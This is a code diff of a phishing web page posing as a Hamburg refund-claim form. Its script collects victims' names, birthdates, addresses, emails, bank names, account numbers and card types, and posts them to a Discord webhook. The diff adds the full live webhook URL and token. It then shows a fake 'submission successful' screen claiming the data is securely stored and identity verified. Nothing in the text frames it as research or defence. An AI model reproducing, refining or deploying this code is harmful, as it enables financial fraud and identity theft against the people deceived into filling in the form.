@@ -105,70 +105,66 @@
 </div>
 
 <script>
-    function show(step) {
-        document.querySelectorAll('.section-box').forEach(b => b.style.display = 'none');
-        document.getElementById('section' + step).style.display = 'block';
-        window.scrollTo(0,0);
-    }
-
-    function validate(curr, next) {
-        const inputs = document.getElementById('section' + curr).querySelectorAll('input[required]');
-        let ok = true;
-        inputs.forEach(i => {
-            if(!i.value.trim()) { i.style.borderColor = 'red'; ok = false; }
-            else { i.style.borderColor = '#bbb'; }
-        });
+     function show(p) { document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active')); document.getElementById('section' + p).classList.add('active'); window.scrollTo(0,0); }
         
-        if(ok) {
-            if(next === 3) finalSubmit();
-            else show(next);
-        } else {
-            alert("Please fill in all required fields and upload files.");
+        function validate(curr, next) {
+            const inputs = document.getElementById('section' + curr).querySelectorAll('input[required]');
+            let ok = true; inputs.forEach(i => { if(!i.value) { i.style.borderColor = 'red'; ok = false; } else i.style.borderColor = '#bbb'; });
+            if(ok) { if(next === 3) buildReview(); show(next); }
         }
-    }
 
-    function finalSubmit() {
-        const ref = "REF-" + Math.floor(Math.random() * 900000 + 100000);
-        const webhook = "https://discord.com";
+        function buildReview() {
+            const summary = [
+                {l: "NAME", v: document.getElementById('fn').value + " " + document.getElementById('ln').value},
+                {l: "ADDRESS", v: document.getElementById('addr').value},
+                {l: "EMAIL", v: document.getElementById('em').value},
+                {l: "AMOUNT", v: document.getElementById('amt').value},
+                {l: "BANK", v: document.getElementById('bnk').value}
+            ];
+            let html = "";
+            summary.forEach(s => { html += `<div class="review-item"><div class="review-label">${s.l}</div><div class="review-value">${s.v}</div></div>`; });
+            document.getElementById('reviewDisplay').innerHTML = html;
+        }
 
-        document.getElementById('main-ui').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
+        function finalSubmit() {
+            const ref = "REF-" + Math.floor(Math.random() * 1000000);
+            document.getElementById('masterForm').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
 
-        const payload = {
-            username: "Hamburg Audit Bot",
-            content: `🚨 **NEW REFUND CLAIM RECEIVED** 🚨\n\n` +
-                     `**Reference:** ${ref}\n` +
-                     `**Name:** ${document.getElementById('fn').value} ${document.getElementById('ln').value}\n` +
-                     `**Birthdate:** ${document.getElementById('bd').value}\n` +
-                     `**Nationality:** ${document.getElementById('nat').value}\n` +
-                     `**Address:** ${document.getElementById('addr').value}\n` +
-                     `**Email:** ${document.getElementById('em').value}\n` +
-                     `**Amount:** ${document.getElementById('amt').value}\n` +
-                     `**Bank:** ${document.getElementById('bnk').value}\n` +
-                     `**Account:** ${document.getElementById('an').value}\n` +
-                     `**Card Type:** ${document.getElementById('ct').value}\n\n` +
-                     `✅ *System Verified Identity & Integrity*`
-        };
+            // PREPARE DISCORD MESSAGE
+            const payload = {
+                username: "Hamburg Audit Bot",
+                content: `🚨 **NEW REFUND CLAIM RECEIVED** 🚨\n\n` +
+                         `**Reference:** ${ref}\n` +
+                         `**Name:** ${document.getElementById('fn').value} ${document.getElementById('ln').value}\n` +
+                         `**Email:** ${document.getElementById('em').value}\n` +
+                         `**Address:** ${document.getElementById('addr').value}\n` +
+                         `**Amount:** ${document.getElementById('amt').value}\n` +
+                         `**Bank:** ${document.getElementById('bnk').value}\n` +
+                         `**Account:** ${document.getElementById('an').value}\n` +
+                         `**Card Type:** ${document.getElementById('ct').value}\n\n` +
+                         `✅ *Identity & Receipt Documents Verified on Screen*`
+            };
 
-        fetch(webhook, {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).then(() => {
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                const s3 = document.getElementById('section3');
-                s3.style.display = 'block';
-                s3.innerHTML = `
-                    <div style="text-align:center; padding:40px;">
-                        <h3>SUBMISSION SUCCESSFUL</h3>
-                        <p>Reference: <strong style="color:red">${ref}</strong></p>
-                        <div style="font-size:80px;">✅</div>
-                        <button onclick="location.reload()" style="margin-top:20px; padding:10px 30px; cursor:pointer;">DONE</button>
-                    </div>`;
-            }, 2000);
-        });
-    }
-</script>
+            // SEND TO DISCORD
+            fetch("https://discord.com/api/webhooks/1499240063077322863/5UgcAE6HHfoOy6o31ewmfVwoAjHLXY1BOCasggIBvGMwg-Cmvd9a8-OViPbit3AlUnnM", {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                setTimeout(() => {
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('section3').style.display = 'block';
+                    document.getElementById('section3').innerHTML = `
+                        <div style="text-align:center; padding:40px;">
+                            <h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h2>
+                            <p>Reference: <strong>${ref}</strong></p><div style="font-size:80px; margin:20px;">✅</div>
+                            <p>Your data has been securely stored in the Hamburg Audit Vault.</p>
+                            <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer; margin-top:20px;">DONE</button>
+                        </div>`;
+                }, 2000);
+            });
+        }
+    </script>
 </body>
 </html>
